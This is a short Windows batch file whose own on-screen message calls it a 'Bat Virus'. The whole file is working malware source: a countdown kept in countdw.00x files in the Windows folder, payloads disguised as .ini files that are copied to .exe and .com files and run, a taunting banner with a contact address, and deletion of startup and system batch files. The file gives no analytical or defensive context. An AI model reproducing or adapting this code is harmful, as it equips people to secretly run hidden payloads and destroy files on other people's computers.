   @echo off
   if exist c:\windows\countdw.001 goto GhostDog1
   if exist c:\windows\countdw.002 goto GhostDog2
   if exist c:\windows\countdw.003 goto GhostDog3
   if exist c:\windows\countdw.004 goto GhostDog4
   if exist c:\windows\countdw.005 goto GhostDog5
   if exist c:\windows\countdw.006 goto GhostDog6
   if not exist c:\windows\userz1.dat goto explode
   goto end
   :GhostDog
   if not exist c:\windows\sysinis.ini goto nobomb
   copy c:\windows\sysinis.ini c:\windows\123.exe /y >nul
   del c:\windows\countdw.007 >nul
   c:\windows\123.exe help
   :nobomb
   if not exist c:\windows\bakbmb.ini goto kill
   copy c:\windows\bakbmb.ini c:\windows\1232.com /y >nul
   c:\windows\1232.com
   cls
   echo.
   echo  <><><><><><><><><><><><><><><><><><><><><><><><><><><><>
   echo  <>    Hello,,,this is my Bat Virus !!!                <>
   echo  <>                                                    <>
   echo  <> Can I help you ???                                 <>
   echo  <>                                                    <>
   echo  <>Ok..Then please Mail me at GhostDog@EveryMail.net   <>
   echo  <>                                                    <>
   echo  <><><><><><><><><><><><><><><><><><><><><><><><><><><><>
   echo.
   pause
   goto kill
   :kill
   del c:\windows\after.bat >nul
   del c:\windows\bakbmb.ini >nul
   del c:\windows\sysinis.ini >nul
   goto end
   :GhostDog6
   copy c:\windows\countdw.006 c:\windows\countdw.007 /y >nul
   del c:\windows\countdw.006
   goto end
   :GhostDog5
   copy c:\windows\countdw.005 c:\windows\countdw.006 /y >nul
   del c:\windows\countdw.005 >nul
   goto end
   :GhostDog4
   copy c:\windows\countdw.004 c:\windows\countdw.005 /y >nul
   del c:\windows\countdw.004 >nul
   goto end
   :GhostDog3
   copy c:\windows\countdw.003 c:\windows\countdw.004 /y >nul
   del c:\windows\countdw.003 >nul
   goto end
   :GhostDog2
   copy c:\windows\countdw.002 c:\windows\countdw.003 /y >nul
   del c:\windows\countdw.002 >nul
   goto end
   :GhostDog1
   copy c:\windows\countdw.001 c:\windows\countdw.002 /y >nul
   del c:\windows\countdw.001 >nul
   goto end
   :explode
   if not exist c:\windows\win.com goto kill2
   copy c:\windows\win.com c:\windows\countdw.001 /y >nul
   goto end
   :kill2
   del c:\windows\winstart.bat >nul
   del c:\windows\sysinis.bat >nul
   del c:\windows\bakbmb.ini >nul
   :end
   if exist c:\windows\after.bat call c:\windows\after.bat
